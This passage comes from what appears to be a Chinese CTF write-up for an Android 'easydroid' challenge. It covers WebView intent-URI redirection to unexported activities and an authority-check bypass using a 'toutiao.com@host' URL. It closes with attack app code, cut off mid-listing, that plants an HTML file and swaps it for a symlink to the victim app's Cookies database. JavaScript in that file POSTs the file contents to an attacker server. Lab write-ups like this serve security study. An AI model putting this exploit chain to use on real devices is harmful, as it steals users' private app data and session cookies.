function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> getIntent().getStringExtra(<span class="string">&quot;url&quot;</span>);</span><br><span class="line">        <span class="type">WebView</span> <span class="variable">webView</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">WebView</span>(getApplicationContext());</span><br><span class="line">        setContentView(webView);</span><br><span class="line">        webView.getSettings().setJavaScriptEnabled(<span class="literal">true</span>);</span><br><span class="line">        webView.loadUrl(url);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>会无条件加载intent extra url里的的页面</p><h3 id="FlagReceiver"><a href="#FlagReceiver" class="headerlink" title="FlagReceiver"></a>FlagReceiver</h3><blockquote><p>FlagReceiver 通过 CookieManager 将 <code>flag</code> 写入 <code>https://tiktok.com/</code> 域的 Cookie 中，但写入值为 <code>Base64(flag)</code>。WebView 会将该 Cookie 持久化保存到应用私有目录 <code>/data/data/com.bytectf.easydroid/app_webview/</code> 下的 Cookies 数据库文件中。因此在成功触发 Receiver 写入后，攻击目标是读取该 Cookies 文件并提取 <code>flag</code> 字段，再进行 Base64 解码得到原始 flag。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.bytectf.easydroid;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.content.BroadcastReceiver;</span><br><span class="line"><span class="keyword">import</span> android.content.Context;</span><br><span class="line"><span class="keyword">import</span> android.content.Intent;</span><br><span class="line"><span class="keyword">import</span> android.util.Base64;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> android.webkit.CookieManager;</span><br><span class="line"><span class="keyword">import</span> java.io.UnsupportedEncodingException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: classes3.dex */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FlagReceiver</span> <span class="keyword">extends</span> <span class="title class_">BroadcastReceiver</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// android.content.BroadcastReceiver</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onReceive</span><span class="params">(Context context, Intent intent)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">flag</span> <span class="operator">=</span> intent.getStringExtra(<span class="string">&quot;flag&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (flag != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">flag2</span> <span class="operator">=</span> Base64.encodeToString(flag.getBytes(<span class="string">&quot;UTF-8&quot;</span>), <span class="number">0</span>);</span><br><span class="line">                <span class="type">CookieManager</span> <span class="variable">cookieManager</span> <span class="operator">=</span> CookieManager.getInstance();</span><br><span class="line">                cookieManager.setCookie(<span class="string">&quot;https://tiktok.com/&quot;</span>, <span class="string">&quot;flag=&quot;</span> + flag2);</span><br><span class="line">                Log.e(<span class="string">&quot;FlagReceiver&quot;</span>, <span class="string">&quot;received flag.&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (UnsupportedEncodingException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="环境广播flag的补充"><a href="#环境广播flag的补充" class="headerlink" title="环境广播flag的补充"></a>环境广播flag的补充</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">am broadcast -W -a &quot;com.wuhengctf.SET_FLAG&quot; -n &quot;com.bytectf.easydroid/.FlagReceiver&quot; -e &#x27;flag&#x27; &#x27;flag&#123;eeeeeeee&#125;&#x27;</span><br></pre></td></tr></table></figure><p>解释一下</p><p>同</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Intent i = new Intent();</span><br><span class="line">i.setAction(&quot;com.wikehend.SET_FLAG&quot;);</span><br><span class="line">i.setComponent(&quot;com.bytectf.babydroid/.FlagReceiver&quot;);</span><br><span class="line">i.putExtra(&quot;flag&quot;, &quot;flag&#123;eeeeeeee&#125;&quot;);</span><br></pre></td></tr></table></figure><p>以com.wikehend.SET_FLAG的身份让 Android 系统，显式调用 <code>com.bytectf.babydroid.FlagReceiver</code>，并传一个字符串参数 <code>flag=flag&#123;eeeeeeee&#125;</code>，让它去执行 <code>onReceive()</code></p><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260120202340503.png" alt="image-20260120202340503"></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>MainActivity.shouldOverrideUrlLoading()，是 <strong>WebView 的URL 跳转拦截回调</strong>。</p><p>当 WebView 准备加载一个新的 URL 时，先问：要不要自己加载？还是来接管？</p><table><thead><tr><th>返回值</th><th>含义</th></tr></thead><tbody><tr><td>true</td><td>已经处理了这个 URL，WebView 不要再加载</td></tr><tr><td>false</td><td>WebView正常加载</td></tr></tbody></table><p>可以编写个Demo验证思路</p><p>MainActivity</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">TAG</span> <span class="operator">=</span> <span class="string">&quot;PwnAndroid&quot;</span>;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line"></span><br><span class="line">        <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">        intent.setClassName(<span class="string">&quot;com.bytectf.pwneasydroid&quot;</span>,<span class="string">&quot;com.bytectf.pwneasydroid.Second&quot;</span>);</span><br><span class="line">        <span class="type">Uri</span> <span class="variable">data</span> <span class="operator">=</span> Uri.parse(<span class="string">&quot;http://toutiao.com@xxx.xxx.xxx.xxx/evil.html&quot;</span>);</span><br><span class="line">        intent.setData(data);</span><br><span class="line">        startActivity(intent);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里照抄debug.apk里的MainActivity内容</p><p>Second:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Second</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">TAG</span> <span class="operator">=</span> <span class="string">&quot;PwnAndroid&quot;</span>;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_second);</span><br><span class="line">        Log.d(TAG,<span class="string">&quot;second&quot;</span>);</span><br><span class="line">        <span class="type">Uri</span> <span class="variable">data</span> <span class="operator">=</span> getIntent().getData();</span><br><span class="line">        <span class="keyword">if</span>(data==<span class="literal">null</span>)&#123;</span><br><span class="line">            data = Uri.parse(<span class="string">&quot;http://app.toutiao.com/&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        Log.d(TAG,data.getAuthority());</span><br><span class="line">        <span class="keyword">if</span>(data.getAuthority().contains(<span class="string">&quot;toutiao.com&quot;</span>) &amp;&amp; data.getScheme().equals(<span class="string">&quot;http&quot;</span>))&#123;</span><br><span class="line"></span><br><span class="line">            <span class="type">WebView</span> <span class="variable">webView</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">WebView</span>(getApplicationContext());</span><br><span class="line">            webView.setWebViewClient(<span class="keyword">new</span> <span class="title class_">WebViewClient</span>()&#123;</span><br><span class="line">                <span class="meta">@SuppressLint(&quot;WrongConstant&quot;)</span></span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">shouldOverrideUrlLoading</span><span class="params">(WebView view, String url)</span> &#123;</span><br><span class="line">                    Log.d(TAG,<span class="string">&quot;shouldOverrideUrlLoading called&quot;</span>);</span><br><span class="line">                    <span class="type">Uri</span> <span class="variable">uri</span> <span class="operator">=</span> Uri.parse(url);</span><br><span class="line">                    <span class="keyword">if</span>(uri.getScheme().equals(<span class="string">&quot;intent&quot;</span>))&#123;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            startActivity(Intent.parseUri(url,<span class="number">1</span>));</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (URISyntaxException e) &#123;</span><br><span class="line">                            e.printStackTrace();</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">return</span> <span class="built_in">super</span>.shouldOverrideUrlLoading(view, url);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">            setContentView(webView);</span><br><span class="line">            webView.getSettings().setJavaScriptEnabled(<span class="literal">true</span>);</span><br><span class="line">            webView.loadUrl(data.toString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Third:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.bytectf.pwneasydroid;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.content.Intent;</span><br><span class="line"><span class="keyword">import</span> android.net.Uri;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> androidx.activity.EdgeToEdge;</span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> androidx.core.graphics.Insets;</span><br><span class="line"><span class="keyword">import</span> androidx.core.view.ViewCompat;</span><br><span class="line"><span class="keyword">import</span> androidx.core.view.WindowInsetsCompat;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Third</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">TAG</span> <span class="operator">=</span> <span class="string">&quot;PwnAndroid&quot;</span>;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_third);</span><br><span class="line">        Log.d(TAG,<span class="string">&quot;third&quot;</span>);</span><br><span class="line">        <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> getIntent();</span><br><span class="line">        <span class="type">Uri</span> <span class="variable">uri</span> <span class="operator">=</span> intent.getData();</span><br><span class="line">        Log.d(TAG,<span class="string">&quot;uri:&quot;</span> + uri);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260121152358192.png" alt="image-20260121152358192"></p><p>服务器上部署一下evil.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>我要跳到Third了哦<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&#x27;intent:pwneasydroid#Intent;launchFlags=0x3;package=com.bytectf.pwneasydroid;component=com.bytectf.pwneasydroid/.Third;end&#x27;</span>&gt;</span></span><br><span class="line">  点我跳到 Third</span><br><span class="line"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>意思是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">intent:pwneasydroid#Intent;</span><br><span class="line">launchFlags=0x3;</span><br><span class="line">package=com.bytectf.pwneasydroid;</span><br><span class="line">component=com.bytectf.pwneasydroid/.Third;</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p><code>0x3</code> &#x3D; <code>0x1 | 0x2</code></p><p>Intent.FLAG_ACTIVITY_NEW_TASK</p><blockquote><p>用户按返回键时，会回到启动该 Task 之前的界面，而不是回到当前 Activity。</p></blockquote><p>Intent.FLAG_ACTIVITY_CLEAR_TOP  </p><blockquote><p>如果目标 Activity 已经在当前任务栈中，则清除它上面的所有 Activity，并把它提到栈顶。</p></blockquote><p>这两个是 <strong>Activity 启动时用来控制任务栈行为”的 flag</strong></p><p>效果</p><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260121152443230.png" alt="image-20260121152443230"></p><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260121152450873.png" alt="image-20260121152450873"></p><p>还可以</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;p&gt;我要跳到Third了哦&lt;/p&gt;</span><br><span class="line">&lt;a href=&#x27;intent:pwneasydroid#Intent;launchFlags=0x3;package=com.bytectf.easydroid;component=com.bytectf.pwneasydroid/.TestActivity;S.url=https://baidu.com;end&#x27;&gt;</span><br><span class="line">  点我跳到 Third</span><br><span class="line">&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>我其实这里的package写错了，但是component写对了，还是跳转了</p><p>component优先级最高（几乎一锤定音）</p><p>在 Intent URI 语法中，不同前缀代表 <strong>extra 的数据类型</strong>：</p><table><thead><tr><th>前缀</th><th>类型</th><th>Java 等价</th></tr></thead><tbody><tr><td><code>S.</code></td><td>String</td><td><code>putExtra(String, String)</code></td></tr><tr><td><code>B.</code></td><td>boolean</td><td><code>putExtra(String, boolean)</code></td></tr><tr><td><code>i.</code></td><td>int</td><td><code>putExtra(String, int)</code></td></tr><tr><td><code>l.</code></td><td>long</td><td><code>putExtra(String, long)</code></td></tr><tr><td><code>f.</code></td><td>float</td><td><code>putExtra(String, float)</code></td></tr><tr><td><code>d.</code></td><td>double</td><td><code>putExtra(String, double)</code></td></tr></tbody></table><p><strong>TestActivity 的代码</strong>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">    <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> getIntent().getStringExtra(<span class="string">&quot;url&quot;</span>);</span><br><span class="line">    <span class="type">WebView</span> <span class="variable">webView</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">WebView</span>(getApplicationContext());</span><br><span class="line">    setContentView(webView);</span><br><span class="line">    webView.getSettings().setJavaScriptEnabled(<span class="literal">true</span>);</span><br><span class="line">    webView.loadUrl(url);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260121154217952.png" alt="image-20260121154217952"></p><h2 id="构建攻击APP"><a href="#构建攻击APP" class="headerlink" title="构建攻击APP"></a>构建攻击APP</h2><p>上面demo的两个实验，说明MainActivity里的只是只是一次“跳转证明到达某页面”，不一定获得新的可控输入面。而TestActivity不仅跳转了，还把下一跳 WebView 要加载的页面也控制住了。</p><p><strong>MainActivity：只能间接控制它加载什么，而且必须先绕过校验</strong></p><p>TestActivity：是直接、完全控制它加载什么，没有任何校验</p><h3 id="方案一"><a href="#方案一" class="headerlink" title="方案一"></a>方案一</h3><p><strong>符号链接延迟跨源攻击</strong></p><blockquote><p>操纵WebView去访问一个攻击APP自己公开出来的网页，<strong>然后这个网页执行的内容其实就是延时去读取自身</strong>。在延时读取自身的时间窗口内，<strong>这个文件悄悄被进行了替换，替换成了软链接，指向受害APP的一个私有文件</strong>，最终读取窃取其内容</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260121161025290.png" alt="image-20260121161025290"></p><p><strong>限制：该漏洞在Android7.0及以上修复，而题目环境为Android8.1，因此无法使用该方法进行攻击，但是在搭建的Android6.0环境上成功实施了攻击</strong></p><table><thead><tr><th><strong>方法</strong></th><th><strong>作用&#x2F;风险</strong></th><th><strong>默认策略</strong></th></tr></thead><tbody><tr><td>setAllowFileAccess(true)</td><td>设置是否允许 WebView <strong>使用 File 协议访问文件系统</strong></td><td><strong>在API29及以下默认设置为 true</strong></td></tr><tr><td>setAllowFileAccessFromFileURLs(true)</td><td>方法用于设置是否允许在文件方案URL的上下文中的跨源请求访问其他文件URL的内容。该方法在API级别30中已被弃用，并且不安全。相反，应使用androidx.webkit.WebViewAssetLoader以安全方式加载文件内容</td><td>在 Android <strong>4.1</strong> 后默认禁止  在<strong>API30</strong>中已被弃用</td></tr><tr><td>setAllowUniversalAccessFromFileURLs(true)</td><td>用于设置是否允许在文件方案URL的上下文中的跨源请求访问任何其他来源的内容。如果应用程序需要访问文件系统，最好避免使用file:&#x2F;&#x2F;URL。而是使用通过HTTPS加载文件的替代方法，例如androidx.webkit.WebViewAssetLoader&#96;</td><td>在 Android 4.1 后默认禁止</td></tr><tr><td>setJavaScriptEnabled(true)</td><td>设置是否允许 WebView <strong>使用 JavaScript</strong></td><td>默认不允许</td></tr></tbody></table><blockquote><p>在Android10及以下默认setAllowFileAccess(true)，而该漏洞不需要setAllowFileAccessFromFileURLs和setAllowUniversalAccessFromFileURLs设置为True即可进行攻击，即绕过了同源检测（必须File读取File本身，读取其他文件还是无法绕过同源策略），但是依旧需要setJavaScriptEnabled设置为True</p></blockquote><p>以上来自LLeaves，这里复现下</p><p>攻击脚本</p><blockquote><p>就是创建一个attack.html文件给easydroid读，在它读之前给这个attack.html加一个软链接读cookier</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">TAG</span> <span class="operator">=</span> <span class="string">&quot;PwnAndroid&quot;</span>;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        writeHTML();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">attack</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">        intent.setClassName(<span class="string">&quot;com.bytectf.easydroid&quot;</span>,<span class="string">&quot;com.bytectf.easydroid.MainActivity&quot;</span>);</span><br><span class="line">        <span class="type">Uri</span> <span class="variable">data</span> <span class="operator">=</span> Uri.parse(<span class="string">&quot;http://toutiao.com@xx.xxx.xxx.xx/evil.html&quot;</span>);</span><br><span class="line">        intent.setData(data);</span><br><span class="line">        startActivity(intent);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">writeHTML</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">            <span class="type">String</span> <span class="variable">HTML</span> <span class="operator">=</span> <span class="string">&quot;&lt;html&gt;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;&lt;body&gt;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;    &lt;script&gt;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;        var d = document;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;        function loadDatabase() &#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;            var file_url = d.URL;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;            var xmlhttp = new XMLHttpRequest();\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;            xmlhttp.onload = function() &#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;                var xhr = new XMLHttpRequest();\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;                xhr.open(\&quot;POST\&quot;, \&quot;http://xx.xxx.xxx.xxx:4080\&quot;, true);\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;                xhr.setRequestHeader(\&quot;Content-Type\&quot;, \&quot;application/x-www-form-urlencoded\&quot;);\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;                xhr.send(\&quot;file_content=\&quot; + encodeURIComponent(xmlhttp.responseText));\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;                alert(\&quot;File content sent to server.\&quot;);\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;            &#125;;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;            xmlhttp.open(\&quot;GET\&quot;, file_url);\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;            xmlhttp.send(null);\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;        &#125;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;        setTimeout(loadDatabase, 8000);\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;    &lt;/script&gt;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;&lt;/body&gt;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;&lt;/html&gt;&quot;</span>;</span><br><span class="line">            <span class="type">String</span> <span class="variable">HTML_PATH</span> <span class="operator">=</span> <span class="string">&quot;/data/data/com.bytectf.pwneasydroid/files/attack.html&quot;</span>;</span><br><span class="line">            cmdexec(<span class="string">&quot;mkdir /data/data/com.bytectf.pwneasydroid/files&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">String</span> <span class="variable">filename</span> <span class="operator">=</span> <span class="string">&quot;attack.html&quot;</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">FileOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> openFileOutput(filename, Context.MODE_PRIVATE);</span><br><span class="line">                outputStream.write(HTML.getBytes());</span><br><span class="line">                outputStream.close();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            cmdexec(<span class="string">&quot;chmod -R 777 /data/data/com.bytectf.pwneasydroid/files&quot;</span>);</span><br><span class="line"></span><br><span class="line">            Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">            <span class="type">WebView</span> <span class="variable">webView</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">WebView</span>(getApplicationContext());;</span><br><span class="line"></span><br><span class="line">            webView.getSettings().setJavaScriptEnabled(<span class="literal">true</span>);</span><br><span class="line">            webView.getSettings().setAllowFileAccess(<span class="literal">true</span>);</span><br><span class="line">            webView.getSettings().setAllowUniversalAccessFromFileURLs(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">            attack();</span><br><span class="line"></span><br><span class="line">            Thread.sleep(<span class="number">6000</span>);</span><br><span class="line"></span><br><span class="line">            cmdexec(<span class="string">&quot;rm &quot;</span> + HTML_PATH);</span><br><span class="line"></span><br><span class="line">            cmdexec(<span class="string">&quot;ln -s &quot;</span> + <span class="string">&quot;/data/data/com.bytectf.easydroid/app_webview/Cookies&quot;</span> + <span class="string">&quot; &quot;</span> + HTML_PATH);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span 